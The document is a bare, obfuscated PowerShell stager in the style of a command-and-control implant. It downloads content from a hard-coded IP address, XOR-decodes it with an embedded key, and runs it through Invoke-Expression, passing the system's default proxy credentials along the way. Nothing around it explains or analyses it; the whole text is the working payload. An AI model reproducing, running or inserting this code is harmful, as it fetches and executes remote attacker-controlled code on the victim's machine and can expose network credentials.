
$Wc=NEw-OBject SYStEm.NET.WEbCLIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEaDERs.AdD('User-Agent',$u);$WC.PROXY = [SYStem.NeT.WEbREqUESt]::DefAuLtWEBProXY;$wc.Proxy.CReDeNTiAlS = [SyStEm.Net.CREdEntiAlCACHE]::DeFAuLTNETwoRkCreDeNtiALs;$K='fb0ee180c36a937082d792c2ba095c74';$I=0;[CHAR[]]$B=([cHar[]]($Wc.DOWnloadStriNg("http://163.172.151.90:80/index.asp")))|%{$_-BXOr$K[$i++%$K.LENGtH]};IEX ($B-jOin'')

